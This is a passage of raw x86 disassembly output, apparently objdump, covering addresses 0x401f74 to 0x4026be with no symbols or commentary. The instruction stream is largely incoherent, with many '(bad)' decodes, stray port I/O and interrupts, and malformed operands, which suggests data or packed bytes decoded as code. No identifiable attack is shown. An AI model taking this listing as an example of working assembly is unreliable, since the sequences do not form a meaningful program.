  401f74:	jo     0x401f59
  401f76:	pop    eax
  401f77:	loope  0x401fcd
  401f79:	sub    dh,BYTE PTR [ebp+0x30]
  401f7c:	add    al,BYTE PTR cs:[ebx]
  401f7f:	sub    al,BYTE PTR [edi]
  401f81:	loop   0x401fae
  401f83:	add    dh,BYTE PTR [ecx-0x67]
  401f86:	pop    ecx
  401f87:	mov    edi,0x50766855
  401f8c:	out    dx,eax
  401f8d:	cwde   
  401f8e:	jl     0x401fab
  401f90:	add    al,0x95
  401f92:	add    BYTE PTR [eax],al
  401f94:	enter  0x81,0x0
  401f98:	pop    esi
  401f99:	adc    BYTE PTR [ecx],dl
  401f9b:	pop    esp
  401f9c:	out    0x55,al
  401f9e:	stos   DWORD PTR es:[edi],eax
  401f9f:	scas   al,BYTE PTR es:[edi]
  401fa0:	mov    esi,0xa25f9032
  401fa5:	and    al,0xac
  401fa7:	sbb    bl,BYTE PTR [ecx+0x9]
  401faa:	sbb    eax,0x6d622a20
  401faf:	push   esi
  401fb0:	adc    ah,BYTE PTR [ebx+0x46]
  401fb3:	div    BYTE PTR [ecx-0x6]
  401fb6:	adc    bh,BYTE PTR [eax+0x5b53b646]
  401fbc:	sub    ch,dh
  401fbe:	iret   
  401fbf:	jo     0x402010
  401fc1:	adc    BYTE PTR [ebx+0x4e],al
  401fc4:	push   ecx
  401fc5:	and    eax,0x6d478e2b
  401fca:	sbb    eax,0x6d4cfb
  401fcf:	add    BYTE PTR [edi+ebp*4-0x103385e2],dl
  401fd6:	add    BYTE PTR [eax],al
  401fd8:	daa    
  401fd9:	xor    BYTE PTR [eax],cl
  401fdb:	sbb    BYTE PTR [eax],al
  401fdd:	add    al,dh
  401fdf:	or     esp,DWORD PTR [edx-0x4d66dda7]
  401fe5:	leave  
  401fe6:	mov    esi,0xa0b12198
  401feb:	mov    ebx,0xc30e941a
  401ff0:	mov    ?,ebx
  401ff2:	push   edx
  401ff3:	cli    
  401ff4:	int    0xcf
  401ff6:	mov    edx,0x7aaee699
  401ffb:	mov    ah,0xb0
  401ffd:	xchg   DWORD PTR [edx],ebp
  401fff:	rcl    BYTE PTR ds:0xf5ec0000,0xc8
  402006:	ins    BYTE PTR es:[edi],dx
  402007:	add    BYTE PTR [eax],al
  402009:	iret   
  40200a:	mov    bh,0xc7
  40200c:	mov    dh,0x9a
  40200e:	arpl   WORD PTR [edx-0x7197879f],bp
  402014:	inc    esi
  402015:	ret    0xf5e0
  402018:	mov    esp,0x44c4b282
  40201d:	add    BYTE PTR [eax],al
  40201f:	mov    dl,0x9b
  402021:	fisubr WORD PTR [esi-0x715025df]
  402027:	(bad)
  40202c:	and    DWORD PTR [ebx],0x12842ed1
  402032:	add    BYTE PTR [eax],al
  402034:	clc    
  402035:	lods   al,BYTE PTR ds:[esi]
  402036:	inc    ebx
  402037:	fld    TBYTE PTR [ebx-0x443da175]
  40203d:	inc    eax
  40203e:	add    BYTE PTR fs:[eax],al
  402041:	mov    ah,0x1b
  402043:	sahf   
  402044:	ret    0x854a
  402047:	je     0x4020b9
  402049:	push   eax
  40204a:	push   eax
  40204b:	fld    TBYTE PTR [esi-0x41]
  40204e:	scas   al,BYTE PTR es:[edi]
  40204f:	mov    esi,0x1a291a73
  402054:	jne    0x40202f
  402056:	and    al,0x72
  402058:	jns    0x402086
  40205a:	lods   al,BYTE PTR ds:[esi]
  40205b:	cli    
  40205c:	jbe    0x402019
  40205e:	es mov esi,0xde6a2673
  402064:	js     0x4020af
  402066:	and    bh,BYTE PTR [ebp-0x62]
  402069:	pop    ecx
  40206a:	(bad)  
  40206b:	cli    
  40206c:	jns    0x402025
  40206e:	cmp    eax,0x291273be
  402073:	sbb    al,0x81
  402075:	fisubr DWORD PTR [eax]
  402077:	inc    ecx
  402078:	jnp    0x402073
  40207a:	sub    edi,DWORD PTR [edx]
  40207c:	xor    BYTE PTR [ecx],0x0
  40207f:	add    BYTE PTR [esi-0x5186a389],cl
  402085:	fwait
  402086:	pop    edx
  402087:	jns    0x4020f6
  402089:	es push esi
  40208b:	jge    0x402076
  40208d:	cmp    BYTE PTR [edx],bh
  40208f:	ja     0x4020e0
  402091:	ss (bad) 
  402093:	jmp    FWORD PTR [ecx+0x69709a5d]
  402099:	sub    DWORD PTR [esi+0x78],esi
  40209c:	cld    
  40209d:	aas    
  40209e:	cmp    ch,BYTE PTR [edi+0x4b]
  4020a1:	sub    bl,ah
  4020a3:	jbe    0x4020a2
  4020a5:	sub    DWORD PTR [edx+0x70],ebx
  4020a8:	sub    DWORD PTR gs:[esi+0x74],esi
  4020ac:	addr16 and eax,0x29476e3a
  4020b2:	add    ah,dh
  4020b4:	add    BYTE PTR [eax],al
  4020b6:	sbb    bl,0x0
  4020b9:	add    ch,ah
  4020bb:	add    ebx,DWORD PTR [edx+0x6f]
  4020be:	sub    DWORD PTR [eax],0xed347386
  4020c4:	mov    dh,0xef
  4020c6:	xor    ebp,ebp
  4020c8:	jae    0x402139
  4020ca:	(bad)  
  4020cb:	sub    DWORD PTR [edx],ebx
  4020cd:	outs   dx,DWORD PTR ds:[esi]
  4020ce:	mov    ebp,0x3075f63d
  4020d3:	in     eax,dx
  4020d4:	cli    
  4020d5:	jo     0x402076
  4020d7:	cmp    eax,0x29fa70a3
  4020dc:	sbb    ch,BYTE PTR [edi+0x49]
  4020df:	sub    bh,ah
  4020e1:	je     0x40212f
  4020e3:	mov    DWORD PTR [eax],eax
  4020e5:	add    al,bl
  4020e7:	int    0x76
  4020e9:	fisubr WORD PTR [edi+0x1c]
  4020ec:	js     0x40214c
  4020ee:	fstp   QWORD PTR [eax]
  4020f0:	js     0x40210f
  4020f2:	out    dx,eax
  4020f3:	ss ja  0x4020de
  4020f6:	sub    edi,edx
  4020f8:	jns    0x402091
  4020fa:	mov    es:0x1a29f271,eax
  402100:	add    BYTE PTR [ebp+0x0],0x0
  402104:	xchg   esp,eax
  402105:	cmp    eax,0x43c47a36
  40210a:	add    BYTE PTR [eax],al
  40210c:	and    al,0x3a
  40210e:	js     0x402183
  402110:	daa    
  402111:	add    BYTE PTR [edi],ah
  402113:	add    BYTE PTR [eax],al
  402115:	and    bh,0x0
  402118:	add    cl,dl
  40211a:	xor    ebx,DWORD PTR [edx+0x78]
  40211d:	push   ebp
  40211e:	and    edx,DWORD PTR [esi+0x75]
  402121:	shl    bl,0x0
  402124:	add    BYTE PTR [eax],ch
  402126:	cmp    dh,BYTE PTR [esi+0x2f]
  402129:	and    eax,0x3d89fffe
  40212e:	scas   eax,DWORD PTR es:[edi]
  40212f:	jae    0x40217a
  402131:	sub    al,0x76
  402133:	je     0x402111
  402135:	sub    BYTE PTR [edx],bh
  402137:	jne    0x402164
  402139:	sub    dh,bh
  40213b:	inc    DWORD PTR [ebp+0x4575563d]
  402141:	scas   al,BYTE PTR es:[edi]
  402142:	nop
  402143:	jno    0x40213d
  402145:	out    dx,al
  402146:	inc    eax
  402147:	stos   DWORD PTR es:[edi],eax
  402148:	add    BYTE PTR [eax],al
  40214a:	jae    0x402173
  40214c:	out    dx,al
  40214d:	(bad)  
  40214e:	inc    DWORD PTR [ecx+0x61705a3d]
  402154:	sub    DWORD PTR [ebp-0x531eb8d],ebp
  40215a:	jae    0x4021a3
  40215c:	sub    ebx,DWORD PTR [ebx+esi*2]
  40215f:	dec    edx
  402160:	ret    0x731a
  402163:	pop    ebp
  402164:	sub    DWORD PTR [esi+0x73],edx
  402167:	adc    BYTE PTR [ecx],ch
  402169:	cli    
  40216a:	jae    0x4021eb
  40216c:	sub    DWORD PTR [esi+0x1a29da73],edi
  402172:	jae    0x40210d
  402174:	sub    BYTE PTR [ebp+0xb],bh
  402177:	xor    dl,BYTE PTR [ebp-0x6]
  40217a:	jb     0x402123
  40217c:	sub    BYTE PTR [esi+0x1a601b73],bh
  402182:	jb     0x402119
  402184:	cmp    BYTE PTR [esi],dh
  402186:	jb     0x402150
  402188:	inc    eax
  402189:	add    BYTE PTR [eax],al
  40218b:	(bad)  
  40218c:	cli    
  40218d:	jb     0x402206
  40218f:	and    al,0xbe
  402191:	jae    0x402165
  402193:	sub    DWORD PTR [edx],ebx
  402195:	jb     0x402208
  402197:	sub    BYTE PTR [esi],dh
  402199:	jb     0x40213f
  40219b:	sub    BYTE PTR [edx],bh
  40219d:	adc    dh,BYTE PTR [ebx]
  40219f:	sub    BYTE PTR [edx+0x13],ah
  4021a2:	pop    esp
  4021a3:	pop    edx
  4021a4:	pop    edx
  4021a5:	jb     0x4021a0
  4021a7:	dec    eax
  4021a8:	rol    DWORD PTR [eax],1
  4021aa:	add    BYTE PTR [edx+esi*2],bh
  4021ad:	fbstp  TBYTE PTR [ebx-0x73f08ef6]
  4021b3:	xlat   BYTE PTR ds:[ebx]
  4021b4:	add    BYTE PTR [eax],al
  4021b6:	pop    esp
  4021b7:	jne    0x402223
  4021b9:	mov    dl,0x5a
  4021bb:	jne    0x4021e6
  4021bd:	jns    0x40221a
  4021bf:	jno    0x40217d
  4021c1:	out    dx,eax
  4021c2:	and    esi,DWORD PTR [ebp+0xb]
  4021c5:	out    dx,eax
  4021c6:	inc    BYTE PTR [ebp+0x66]
  4021c9:	sub    BYTE PTR [edx+0x35],bl
  4021cc:	in     eax,0x2a
  4021ce:	(bad)  [eax]
  4021d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021d1:	add    BYTE PTR [eax],al
  4021d3:	pop    esi
  4021d4:	dec    ebx
  4021d5:	ja     0x40224b
  4021d7:	pop    esi
  4021d8:	adc    edi,esi
  4021da:	inc    ebp
  4021db:	popf   
  4021dc:	and    al,0x1c
  4021de:	jne    0x402221
  4021e0:	sub    esi,DWORD PTR [esi+0x74]
  4021e3:	hlt    
  4021e4:	sub    BYTE PTR [eax+0x74],bl
  4021e7:	and    eax,edx
  4021e9:	mov    esi,0x1a2abe74
  4021ee:	jne    0x40226d
  4021f0:	sub    al,BYTE PTR [ecx-0x5d60f8a]
  4021f6:	mov    dl,0xe3
  4021f8:	sub    ah,BYTE PTR ds:0x1a58e860
  4021fe:	jne    0x4021e6
  402200:	dec    eax
  402201:	mov    BYTE PTR [eax],al
  402203:	add    BYTE PTR [esi],dh
  402205:	je     0x4021a3
  402207:	and    al,0x1c
  402209:	jns    0x402266
  40220b:	aaa    
  40220c:	mov    esi,0xc022b674
  402211:	ja     0x402213
  402213:	add    BYTE PTR [ebp+esi*2-0x3b],dh
  402217:	pusha  
  402218:	jb     0x4021c2
  40221a:	lods   al,BYTE PTR ds:[esi]
  40221b:	cli    
  40221c:	imul   edx,DWORD PTR [edi+0x28],0xffffffbe
  402220:	je     0x4021d4
  402222:	sub    bl,BYTE PTR [edx]
  402224:	xor    BYTE PTR [ecx],dl
  402226:	sub    BYTE PTR ds:0x958472,al
  40222c:	add    al,dl
  40222e:	and    esi,DWORD PTR [edx+0x33]
  402231:	in     al,dx
  402232:	inc    BYTE PTR [ebp+0x4e]
  402235:	sub    BYTE PTR [edx+0x72],bl
  402238:	or     eax,0x8070cd28
  40223d:	mov    dl,0x0
  40223f:	add    bh,dl
  402241:	sahf   
  402242:	je     0x402233
  402244:	in     eax,0xfe
  402246:	inc    ebp
  402247:	dec    edx
  402248:	sub    BYTE PTR [edx+0x77],bl
  40224b:	or     DWORD PTR ds:0x129c70bc,esp
  402251:	and    esi,DWORD PTR [ebx-0x15]
  402254:	jmp    0x28866857
  402259:	pop    edx
  40225a:	ja     0x402261
  40225c:	and    eax,0xd3b8733e
  402261:	(bad)  
  402262:	jo     0x40224b
  402264:	xchg   edx,eax
  402265:	inc    BYTE PTR [ebp+0x42]
  402268:	sub    BYTE PTR [edx+0x70],bl
  40226b:	and    DWORD PTR [ebx],ebp
  40226d:	jnp    0x4022e4
  40226f:	aam    0xee
  402271:	std    
  402272:	jne    0x402277
  402274:	out    dx,al
  402275:	mov    esi,0x1a2b9e75
  40227a:	jne    0x4022d9
  40227c:	and    al,0x7c
  40227e:	jae    0x402250
  402280:	sar    dl,cl
  402282:	je     0x4022c3
  402284:	and    eax,0x2b9a75be
  402289:	sbb    dh,BYTE PTR [edi+0x59]
  40228c:	sub    ebp,DWORD PTR [edx+edi*2]
  40228f:	lods   al,BYTE PTR ds:[esi]
  402290:	adc    bh,dl
  402292:	je     0x4022cf
  402294:	and    DWORD PTR [esi-0x52d4698b],edi
  40229a:	jbe    0x4022f1
  40229c:	sar    DWORD PTR [edi],cl
  40229e:	jb     0x402228
  4022a0:	das    
  4022a1:	add    BYTE PTR [eax],al
  4022a3:	xlat   BYTE PTR ds:[ebx]
  4022a4:	cli    
  4022a5:	imul   esi,DWORD PTR [edi],0x28
  4022a8:	mov    esi,0x1a2b9275
  4022ad:	jb     0x4022e0
  4022af:	sub    BYTE PTR ds:0x23d76472,al
  4022b5:	jb     0x4022ca
  4022b7:	in     al,dx
  4022b8:	inc    BYTE PTR [ebp+0x2e]
  4022bb:	sub    BYTE PTR [edx+0x7b],bl
  4022be:	in     eax,dx
  4022bf:	and    ch,cl
  4022c1:	outs   dx,BYTE PTR ds:[esi]
  4022c2:	pusha  
  4022c3:	fild   DWORD PTR [eax+0x14]
  4022c6:	add    BYTE PTR [eax],al
  4022c8:	js     0x402299
  4022ca:	and    al,0xfe
  4022cc:	inc    ebp
  4022cd:	sub    ch,BYTE PTR [eax]
  4022cf:	pop    edx
  4022d0:	jbe    0x4022bb
  4022d2:	daa    
  4022d3:	lea    esi,[edx+0x7c]
  4022d6:	(bad)  
  4022d7:	int    0x73
  4022d9:	retf   
  4022da:	test   al,0xfe
  4022dc:	inc    ebp
  4022dd:	sub    BYTE PTR es:[edx+0x72],bl
  4022e1:	in     eax,0x2b
  4022e3:	cld    
  4022e4:	outs   dx,BYTE PTR ds:[esi]
  4022e5:	cwde   
  4022e6:	push   eax
  4022e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022e8:	jb     0x4022b1
  4022ea:	scas   eax,DWORD PTR es:[edi]
  4022eb:	inc    BYTE PTR [ebp+0x22]
  4022ee:	sub    BYTE PTR [edx+0x75],bl
  4022f1:	add    DWORD PTR [ebx],ebp
  4022f3:	pop    esp
  4022f4:	jp     0x4022aa
  4022f6:	adc    edi,edx
  4022f8:	jne    0x4022dd
  4022fa:	sub    bh,BYTE PTR [esi+0x1a247e75]
  402300:	jne    0x40233f
  402302:	and    al,0xa4
  402304:	jne    0x4022b6
  402306:	push   ebx
  402307:	cli    
  402308:	jbe    0x402329
  40230a:	and    al,0xbe
  40230c:	jne    0x402388
  40230e:	and    al,0x1a
  402310:	jns    0x40234b
  402312:	and    eax,0x988c76b9
  402317:	add    BYTE PTR [eax],al
  402319:	(bad)  
  40231a:	cli    
  40231b:	jbe    0x402338
  40231d:	and    edi,DWORD PTR [esi+0x1a247675]
  402323:	jp     0x40235a
  402325:	sub    DWORD PTR [edi],edi
  402327:	js     0x402391
  402329:	(bad)  
  40232a:	cli    
  40232b:	imul   edx,DWORD PTR [edi],0x21
  40232e:	mov    esi,0x1a247275
  402333:	jb     0x402346
  402335:	sub    BYTE PTR ds:0xb04472,al
  40233b:	add    bh,dl
  40233d:	push   ds
  40233e:	jle    0x40232e
  402340:	in     eax,0xfe
  402342:	inc    ebp
  402343:	push   cs
  402344:	sub    BYTE PTR [edx+0x7a],bl
  402347:	int    0x23
  402349:	int    0x68
  40234b:	inc    eax
  40234c:	xor    BYTE PTR [eax],al
  40234e:	add    bl,bl
  402350:	inc    eax
  402351:	push   ebp
  402352:	add    BYTE PTR [eax],al
  402354:	jnp    0x402305
  402356:	inc    BYTE PTR [di+0xa]
  40235a:	sub    BYTE PTR [edx+0x79],bl
  40235d:	leave  
  40235e:	lea    esi,es:[ebp+0x5c]
  402362:	fisttp DWORD PTR [esi+0x72]
  402365:	stos   DWORD PTR es:[edi],eax
  402366:	xchg   edx,eax
  402367:	inc    BYTE PTR [ebp+0x6]
  40236a:	sub    bh,ch
  40236c:	outs   dx,BYTE PTR ds:[esi]
  40236d:	lds    ebp,FWORD PTR [eax-0x73]
  402370:	ja     0x4023ea
  402372:	aad    0xf8
  402374:	jne    0x40231d
  402376:	adc    BYTE PTR [ebx-0x2],al
  402379:	test   ch,bh
  40237b:	add    BYTE PTR [eax],al
  40237d:	sub    al,0xaf
  40237f:	outs   dx,BYTE PTR ds:[esi]
  402380:	loope  0x4023ed
  402382:	js     0x4023f2
  402384:	xchg   esp,eax
  402385:	aam    0xfd
  402387:	jno    0x40234c
  402389:	out    dx,eax
  40238a:	mov    esi,0x1a245e75
  40238f:	jne    0x4023ae
  402391:	and    al,0x25
  402393:	jns    0x402325
  402395:	shl    edi,cl
  402397:	jns    0x402398
  402399:	imul   edi,DWORD PTR [esi+0x1a245a75],0x79
  4023a0:	sbb    DWORD PTR [edi],esp
  4023a2:	mov    ebp,0xfad316fc
  4023a7:	mov    eax,0x75be3eb2
  4023ac:	push   esi
  4023ad:	and    al,0x1a
  4023af:	inc    eax
  4023b0:	pop    ebx
  4023b1:	add    BYTE PTR [eax],al
  4023b3:	and    BYTE PTR [ebx],ch
  4023b5:	jge    0x4023f7
  4023b7:	xchg   ecx,eax
  4023b8:	add    BYTE PTR [eax],al
  4023ba:	adc    edx,ebx
  4023bc:	cli    
  4023bd:	je     0x4023b6
  4023bf:	ds icebp 
  4023c1:	in     eax,0xd5
  4023c3:	mov    cl,0x1
  4023c5:	inc    eax
  4023c6:	or     eax,DWORD PTR [eax]
  4023c8:	add    al,dh
  4023ca:	xchg   DWORD PTR [ebx+esi*1],ebx
  4023cd:	and    al,0x7e
  4023cf:	xchg   ecx,eax
  4023d0:	outs   dx,BYTE PTR ds:[esi]
  4023d1:	gs ss repnz adc al,0xc4
  4023d6:	pop    edi
  4023d7:	add    BYTE PTR [eax],al
  4023d9:	jg     0x402435
  4023db:	shl    BYTE PTR ds:0x4a2064c1,1
  4023e2:	pop    esi
  4023e3:	xor    eax,0x643fa9d9
  4023e8:	scas   al,BYTE PTR es:[edi]
  4023e9:	jge    0x4023c2
  4023eb:	sti    
  4023ec:	addr16 je 0x40238f
  4023ef:	stos   BYTE PTR es:[edi],al
  4023f0:	aad    0xf6
  4023f2:	dec    edx
  4023f3:	jnp    0x402405
  4023f5:	mov    ebp,0x21484b
  4023fa:	add    dh,ah
  4023fc:	ds fwait
  4023fe:	jb     0x40245d
  402400:	(bad)  
  402401:	cld    
  402402:	outs   dx,BYTE PTR ds:[esi]
  402403:	sub    BYTE PTR [ecx+0x66b226be],0x32
  40240a:	lahf   
  40240b:	cld    
  40240c:	push   0x56
  40240e:	mov    ah,BYTE PTR [edx-0x513202a6]
  402414:	mov    esp,0x20c2f2fa
  402419:	mov    edx,0xdacc6376
  40241e:	add    BYTE PTR [eax],al
  402420:	push   es
  402421:	std    
  402422:	add    dl,BYTE PTR [edi-0x6]
  402425:	(bad)  
  402426:	imul   edi,DWORD PTR [edi+0x2a],0x762e5f7b
  40242d:	ja     0x402428
  40242f:	cmc    
  402430:	xchg   ecx,eax
  402431:	imul   edi,DWORD PTR [ecx+ebx*2+0x40],0x2e000014
  402439:	jbe    0x402403
  40243b:	hlt    
  40243c:	add    BYTE PTR [eax],al
  40243e:	(bad)  
  40243f:	and    al,0x33
  402441:	out    dx,al
  402442:	jmp    FWORD PTR [ebx-0x5b]
  402445:	jbe    0x40241e
  402447:	cmp    esp,DWORD PTR [ebx*4+0x4a15461a]
  40244e:	sub    eax,0xff57fef6
  402453:	icebp  
  402454:	sub    BYTE PTR [ebx-0x4],ah
  402457:	retf   
  402458:	cli    
  402459:	sbb    eax,0x5bf7c676
  40245e:	jge    0x40241e
  402460:	inc    edx
  402461:	scas   al,BYTE PTR es:[edi]
  402462:	dec    ebp
  402463:	mov    ebp,0x8a3e7aea
  402468:	xchg   ecx,eax
  402469:	mov    ebp,0xbbf9bd30
  40246e:	aas    
  40246f:	sti    
  402470:	push   ss
  402471:	ins    BYTE PTR es:[edi],dx
  402472:	ror    DWORD PTR [ebx-0x18fc7663],0x58
  402479:	jg     0x402496
  40247b:	ins    DWORD PTR es:[edi],dx
  40247c:	xor    al,0xf1
  40247e:	push   ecx
  40247f:	das    
  402480:	popf   
  402481:	xor    al,0x26
  402483:	jae    0x4024bb
  402485:	imul   ecx,DWORD PTR [edx+0x76e446e3],0x6f
  40248c:	add    BYTE PTR [ebx],ch
  40248e:	add    BYTE PTR [eax],al
  402490:	ins    BYTE PTR es:[edi],dx
  402491:	add    eax,0xe0feedc2
  402496:	retf   0xc1c3
  402499:	rcl    dh,0x0
  40249c:	add    BYTE PTR [edi],dh
  40249e:	into   
  40249f:	stos   BYTE PTR es:[edi],al
  4024a0:	jb     0x402434
  4024a2:	cmp    DWORD PTR [edi-0x48],edx
  4024a5:	es xchg ah,ah
  4024a8:	sub    DWORD PTR ds:0x86882b1e,ecx
  4024ae:	add    BYTE PTR [eax],al
  4024b0:	jbe    0x4024ad
  4024b2:	adc    edx,DWORD PTR [esi+0x25]
  4024b5:	push   eax
  4024b6:	sub    bh,BYTE PTR [eax+0x25]
  4024b9:	jge    0x4024e4
  4024bb:	sbb    eax,edi
  4024bd:	add    al,0xe8
  4024bf:	add    BYTE PTR [eax],al
  4024c1:	bound  esi,QWORD PTR [ebp+0x24]
  4024c4:	lods   eax,DWORD PTR ds:[esi]
  4024c5:	je     0x4024fa
  4024c7:	push   0x64
  4024c9:	adc    eax,0x6d82efeb
  4024ce:	fisub  WORD PTR [eax-0x78]
  4024d1:	test   al,0x0
  4024d3:	add    BYTE PTR [esi+0x3a75d7b1],dl
  4024d9:	ss stc 
  4024db:	mov    bh,0x6d
  4024dd:	mov    dh,BYTE PTR [edi-0x7183c192]
  4024e3:	mov    dh,dl
  4024e5:	icebp  
  4024e6:	pop    ebx
  4024e7:	mov    al,0xb1
  4024e9:	inc    ecx
  4024ea:	push   ds
  4024eb:	mov    edi,0x1acbe331
  4024f0:	and    ch,BYTE PTR [ebx]
  4024f2:	inc    ebp
  4024f3:	(bad)  
  4024f4:	loopne 0x402476
  4024f6:	mov    BYTE PTR [eax],al
  4024f8:	add    BYTE PTR [esi],bh
  4024fa:	pushf  
  4024fb:	(bad)  
  4024fc:	sub    BYTE PTR [eax-0x75ffffe3],al
  402502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402503:	cmp    DWORD PTR [ebx],esi
  402505:	aam    0xbb
  402507:	leave  
  402508:	ins    BYTE PTR es:[edi],dx
  402509:	cmp    eax,0x70f7aee4
  40250e:	fcomp  DWORD PTR [esi+0x645cef3b]
  402514:	iret   
  402515:	pop    edx
  402516:	scas   al,BYTE PTR es:[edi]
  402517:	jecxz  0x40250a
  402519:	adc    edx,DWORD PTR [ebp+0xd]
  40251c:	jle    0x4024f1
  40251e:	sub    eax,DWORD PTR ds:0xb0af09bc
  402524:	outs   dx,BYTE PTR ds:[esi]
  402525:	pop    eax
  402526:	dec    ebx
  402527:	pop    ebp
  402528:	icebp  
  402529:	dec    ebp
  40252a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40252b:	add    al,0xf9
  40252d:	add    BYTE PTR [eax],al
  40252f:	jae    0x40250e
  402531:	ins    BYTE PTR es:[edi],dx
  402532:	sbb    eax,0xa314e147
  402537:	mov    dh,0xd4
  402539:	jmp    0x4024fb
  40253b:	pop    ebx
  40253c:	add    BYTE PTR [eax],al
  40253e:	xor    eax,0x30b13af5
  402543:	mov    ebp,0x1c8bb67a
  402548:	pop    edi
  402549:	ins    DWORD PTR es:[edi],dx
  40254a:	fsub   QWORD PTR [edx]
  40254c:	sar    edi,cl
  40254e:	fwait
  40254f:	inc    ebx
  402550:	adc    al,BYTE PTR [ebp-0x3a4146c1]
  402556:	xor    dh,BYTE PTR [esi]
  402558:	and    al,0x91
  40255a:	jo     0x40256a
  40255c:	jp     0x402591
  40255e:	aad    0x48
  402560:	jo     0x402562
  402562:	add    dh,al
  402564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402565:	adc    ebp,ebp
  402567:	pop    edi
  402568:	repz push ds
  40256a:	push   ebx
  40256b:	inc    esp
  40256c:	out    0x0,eax
  40256e:	add    bh,cl
  402570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402571:	lock xchg ebp,eax
  402573:	jo     0x402514
  402575:	xlat   BYTE PTR ds:[ebx]
  402576:	xchg   ebp,eax
  402577:	xchg   ebx,eax
  402578:	push   eax
  402579:	xlat   BYTE PTR ds:[ebx]
  40257a:	xchg   edx,eax
  40257b:	xor    al,0xee
  40257d:	jnp    0x402515
  40257f:	inc    ebp
  402580:	mov    ?,WORD PTR [ebx]
  402582:	xor    DWORD PTR [ebx-0x32],esp
  402585:	fisttp QWORD PTR [esi+0x3e1ec582]
  40258b:	aad    0x96
  40258d:	dec    esp
  40258e:	push   ebx
  40258f:	add    BYTE PTR [eax],al
  402591:	shl    DWORD PTR [edx],0xf1
  402594:	inc    ecx
  402595:	fmul   DWORD PTR [esi-0x423d3001]
  40259b:	push   0x68
  40259d:	ins    DWORD PTR es:[edi],dx
  40259e:	ss adc ebx,ebp
  4025a1:	lods   al,BYTE PTR ds:[esi]
  4025a2:	pop    ss
  4025a3:	jmp    DWORD PTR [eax+0x2a]
  4025a6:	scas   al,BYTE PTR es:[edi]
  4025a7:	imul   dl
  4025a9:	pop    es
  4025aa:	add    BYTE PTR [esi+0x0],ah
  4025ad:	add    BYTE PTR [esi],bh
  4025af:	pop    ebx
  4025b0:	(bad)  [edx+0xff44b4]
  4025b6:	add    BYTE PTR [edx],bh
  4025b8:	push   ebp
  4025b9:	cli    
  4025ba:	xchg   ecx,eax
  4025bb:	daa    
  4025bc:	(bad)  
  4025bd:	mov    edi,0x84914309
  4025c2:	sub    eax,0x38680000
  4025c7:	xchg   DWORD PTR [edx+0x3d9c7f2f],esp
  4025cd:	sub    bl,bh
  4025cf:	and    al,al
  4025d1:	lods   eax,DWORD PTR ds:[esi]
  4025d2:	add    BYTE PTR [eax],al
  4025d4:	(bad)  
  4025d5:	out    0x4f,eax
  4025d7:	stos   DWORD PTR es:[edi],eax
  4025d8:	sbb    al,0xfd
  4025da:	push   esi
  4025db:	stos   BYTE PTR es:[edi],al
  4025dc:	pop    edx
  4025dd:	data16 outs dx,BYTE PTR ds:[esi]
  4025df:	inc    esp
  4025e0:	pop    eax
  4025e1:	add    BYTE PTR [eax],al
  4025e3:	mov    edi,0xda077e37
  4025e8:	es repz enter 0x57,0x0
  4025ee:	mov    cl,0x6
  4025f0:	mov    BYTE PTR [eax+eax*1-0x731c0f00],ah
  4025f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025f8:	add    BYTE PTR [eax],al
  4025fa:	loopne 0x402611
  4025fc:	fist   DWORD PTR [ebx+0x6959f689]
  402602:	sub    al,BYTE PTR [eax+0x6c000075]
  402608:	mov    BYTE PTR ds:0xb4da98f1,0x89
  40260f:	xor    esi,DWORD PTR [eax+0x4607c26d]
  402615:	xchg   DWORD PTR [edi-0x5f],esi
  402618:	push   edx
  402619:	fisttp QWORD PTR [esi]
  40261b:	push   ds
  40261c:	dec    ebp
  40261d:	add    ecx,DWORD PTR [esi]
  40261f:	in     eax,dx
  402620:	sti    
  402621:	jmp    0x4170a9c3
  402626:	push   ds
  402627:	push   0xffffffda
  402629:	stos   DWORD PTR es:[edi],eax
  40262a:	and    ah,dl
  40262c:	adc    dl,BYTE PTR [ebx]
  40262e:	cmc    
  40262f:	xchg   edi,eax
  402630:	inc    esp
  402631:	inc    edi
  402632:	add    BYTE PTR [eax],al
  402634:	popa   
  402635:	mov    es,edx
  402637:	pop    esp
  402638:	push   ebp
  402639:	and    DWORD PTR [ecx],ebp
  40263b:	popa   
  40263c:	in     eax,0x6c
  40263e:	xor    BYTE PTR [edi-0x2e0d076f],bh
  402644:	push   0x63
  402646:	xor    ah,bh
  402648:	mov    al,ds:0xd400e3
  40264d:	add    BYTE PTR [ecx-0xf],bh
  402650:	mov    BYTE PTR [edi+0x0],dl
  402653:	add    BYTE PTR [ecx],ch
  402655:	out    0x6c,eax
  402657:	out    dx,al
  402658:	or     ah,ch
  40265a:	ds push cs
  40265c:	je     0x40268d
  40265e:	lock pusha 
  402660:	test   esp,esp
  402662:	jbe    0x4026e3
  402664:	jne    0x4026d0
  402666:	loopne 0x4025ed
  402668:	test   BYTE PTR [ebp+0x0],al
  40266b:	add    BYTE PTR [edi-0x5d],ch
  40266e:	in     al,dx
  40266f:	xchg   ecx,eax
  402670:	push   edi
  402671:	pushf  
  402672:	jle    0x4026cb
  402674:	add    ebx,eax
  402676:	push   0xffffffe9
  402678:	pushf  
  402679:	cli    
  40267a:	inc    ecx
  40267b:	lods   eax,DWORD PTR ds:[esi]
  40267c:	cmp    BYTE PTR [esi-0x7f],dh
  40267f:	dec    ebp
  402680:	test   BYTE PTR [ebp+0x80f0000],al
  402686:	mov    DWORD PTR [eax],0x2025f200
  40268c:	mov    ecx,0x45b4971e
  402691:	push   0xe78af5b9
  402696:	js     0x402696
  402698:	push   esp
  402699:	add    eax,DWORD PTR [edx+0x1b4ddbe1]
  40269f:	ss cmc 
  4026a1:	imul   ebp,edx,0x7f
  4026a4:	rol    BYTE PTR [ebx+0x0],0x0
  4026a8:	push   ebp
  4026a9:	in     eax,0xda
  4026ab:	push   edi
  4026ac:	push   esp
  4026ad:	fsubr  st,st(7)
  4026af:	rcr    DWORD PTR [eax+0x7a],0xca
  4026b3:	icebp  
  4026b4:	pop    edx
  4026b5:	sbb    BYTE PTR [edi-0x54],al
  4026b8:	ret    
  4026b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026ba:	pop    esp
  4026bb:	(bad)  
  4026bc:	pop    eax
  4026bd:	popf   
  4026be:	add    edx,0x967e572
